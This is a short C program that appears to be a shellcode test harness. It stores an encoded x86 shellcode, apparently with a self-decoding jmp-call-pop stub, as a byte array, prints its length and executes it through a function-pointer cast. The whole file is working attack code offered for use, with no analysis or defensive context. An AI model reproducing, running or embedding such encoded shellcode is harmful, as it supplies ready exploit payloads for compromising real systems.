#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x1a\x5e\x31\xc9\xb1\x19\xf6\x06\x01\x75\x05\x80\x06\x01\xeb\x03\x80\x2e\x03\x80\x06\x04\x46\xe2\xed\xeb\x05\xe8\xe1\xff\xff\xff\x2c\xbf\x4f\x67\x2a\x2a\x6e\x67\x67\x2a\x61\x64\x6d\x84\xde\x4f\x84\xe1\x4e\x84\xdc\xaf\x06\xc8\x7f";


main()
{

printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();

}